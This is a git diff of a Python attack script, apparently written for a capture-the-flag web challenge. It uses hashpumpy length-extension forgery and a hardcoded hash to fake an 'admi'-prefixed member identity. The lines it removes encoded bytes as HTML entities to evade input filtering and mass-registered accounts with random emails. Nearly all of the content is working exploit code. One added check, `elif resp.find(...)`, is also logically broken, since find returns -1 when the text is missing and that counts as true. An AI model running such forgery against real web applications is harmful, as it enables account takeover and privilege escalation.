@@ -4,7 +4,7 @@ import hashpumpy
 import urllib.parse
 import string
 
-from functions import stick_register, stick_login
+from functions import stick_register, stick_login, stick_member
 
 import random
 domains = [ "hotmail.com", "gmail.com", "aol.com", "mail.com" , "mail.kz", "yahoo.com"]
@@ -29,16 +29,9 @@ def main():
     for r in results:
         register_user = urllib.parse.quote_from_bytes(r[1])
         print("{} => {}".format(r[0], register_user))
+        print(register_user)
+        status, data = stick_member(register_user, '5b18c8fd186116e2c474fd89e68b3f46f402e563', prefix='admi')
 
-        evading_user = register_user.replace('%00', '&#00000000').replace('%80', '&#00000128')
-        #register_user = "4&#00000004&#0000097&#0000097"
-        register_email = generate_random_emails(1, 15)[0]
-        register_pwd   = get_random_name(letters, 12)
-
-        
-
-        print(evading_user, register_email, register_pwd)
-        status, data = stick_register(evading_user, register_email, register_pwd)
         print("Code: {}".format(status))
         if status == 200:
             resp = data.getvalue().decode()
@@ -53,12 +46,10 @@ def main():
                 break
             elif resp.find('Registered !') > 0:
                 print("OK: Registered")
+            elif resp.find('email or password empty'):
+                print("KO: Hash doesn't work")
             else:
                 print(resp)
-
-        #status = stick_login(register_email, register_user)
-        #print("Code: {}".format(status))
-        break
 
 if __name__ == "__main__":
     main()
